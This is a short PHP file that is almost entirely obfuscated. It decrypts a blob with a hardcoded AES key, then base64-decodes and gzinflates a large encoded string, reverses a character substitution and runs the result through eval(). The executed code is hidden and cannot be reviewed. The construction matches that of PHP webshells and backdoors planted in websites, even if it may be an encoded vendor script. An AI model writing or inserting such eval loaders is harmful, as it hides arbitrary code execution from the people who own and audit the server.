<?php
function leexe($pesan, $encryption_key){$key = hex2bin($encryption_key); $pesan = base64_decode($pesan); $nonceSize = openssl_cipher_iv_length('aes-256-ctr'); $nonce = mb_substr($pesan, 0, $nonceSize, '8bit'); $cipherText = mb_substr($pesan, $nonceSize, null, '8bit'); $plaintext = openssl_decrypt($cipherText, 'aes-256-ctr', $key, OPENSSL_RAW_DATA, $nonce ); return $plaintext; } $private_secret_key = '1f4276388ad3214c873428dbef42243f';
$new = leexe('Gi8CiFO/ij0jhMZ3aZhjbhPNHNtxVzWFRzzcz78gXoKsu703z16wY3oOkm2t3CtiQ2Jcb3H7b0DDMD2O1FE3tvKYXrHXE1e55l4QVEeURNccZo/6zJOAynb+eq5l4T0cOg6rC0UEAs5/hbCKLkTGm0o49CEB1BxZurYgG4r+aX3OMe8FDdHMuhpMM/EbopJgoaflNi+EBLc8lSdJ2Y2vac+ZAbAuB9jBuTggSzFyNNry+C0Z/c7YZ/HgRWlD+vaX1Rjo82oSRfynUXzlLAcy7Vgh/NtH29wf',$private_secret_key);
$SISTEMIT_COM_ENC = "7VfdauM4FL4fmJdoA7J3s0nrJG2aNi3dbmeHZTpd2hmG3VAKMcTQKMKjmzY75LH0QMagC5lc+EJXorCS/O+q7sxsYWGoaamsc76j7xydH5e8fkVIy8N8Fs3JmCyW9DOMrj+HAi+t1jxAbbJxefru9OQDOTt//+GtxTw4FTCyCadkGkIuFR4KOPLmvE0uP55ZLGAc6k29Im8uzs+IUiS/X5x//JP8+ldiZsPe10wSrTGZXCXvWli8364jKKzWlOOIjlOyM8Hc9TXHmEvKiSe2/UVpExLNUuUJ0JbA1Xi8a3+p7Un74I8QRmCfrASkwggbGmHHXkhZSBuRO48ciJoP3DbDOArlZiPSMSLfiCl+EtozQs84FqwR1zdHx8cRbMQNzOeJZpZ7RtSl8JlYTAVuDuuWEXw+Z8GTUPOVvA/uv+JY86X8JmiGTTJ2lfxJCmGidKwZDDizM7AWgKQcsgJJ9CjDEfLs2ilacSWtlyrded5S/7qqdupl7Tyo68ATDVXt5GXdug2W24UPZd0Gt5r70ae3pxendQ/lDSlSE833CmzY9n7BwPkuBmuOPb7gNJz/dBMuIF/X2WhZnc4TVHrPFwxfIE9A2Shk3/02Ev3vjwcOKX8sHlr2DVRU9SlBteOXd4z9vgoZGiCmXl9F7RgPQk0HbZsghh5fRTkGlLG/V2E9A+xhb69i+qZIPOjrVczAdI5oYrZnQJj7eS18WwagqZfXYKawG/t4DWcKfHMPdypNXDWuvIf/Utp1jLs9427fPAWc6hgo08yHwNHh61cH1MWRzwjF7nij0+lySgWjXR+GXoRo15UVyTo3tHuiF4sIyZeNw4NuAisMHOpWbs1C5LIoQMSyie7PIJSxUyxcBpKxc88xYZE7p5dsCYUkmfbxWYDYSQADPCJgs7832BrsgnYh0tpSNA1gDLQHhblFEAuiH3kDEYrFHchEEWICU+EyKWI4FAWotVhqp6SgZYFNOVb8NbBzk6lQSpG4JfrFyiDtjDNb+upgRYvjjG3MGdebqRIhkMsJQtXWwdGY3NAAXQvkStJWcln2Pjk6bGfaCq8uYUQm2RYpbKlnyt25h4MQxTpg0u4EbIphTwxd0AabzpDv9gdqFbu9Qboa8OHOVK12Zn3H3QZX7YrFAMcCJ9YShzZn+gEVtdS17DH4k4wR5U+BW2XLq7QkUpuBr1KFlgK14PK+5O8x9eWVXXApH5EZl/WX02BBAFnk0wqNUnTyXBjpZYl+ngqjYplJV7neWhY+JpXnWe1D4QkUP24/jqgP+TJ1+yGeuhwK+jh+eXwnVOpUEqbbrdmt3KqHo/hdhAQdVdMsJ5MdowqoXdWAEvcpitk6TZu+fwdqKm6WVakK9qbc2mqT5Kfj2HXAPwIHik/WDZj8/KC+HE2IgbLmqoLTPSU5otURd0xG2aq5MxWyqR2zv6V9ozMytFDVlgxS3sfuOZR6RHeVNtFv1K7HSX1opKrkcEy2DQokwZKuFNdlq/qGnMIhRgRc+B0CyM8JtKq0qkai1FLtUuWVq/zOlBn5DRsC8mRe1JK08U4KfmV6eX6XhuVKOrBSH3A/xEih/9NMcX60oeK8TJWXqfIyVV6myn+cKvn/Lv8C";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP=$new;
?>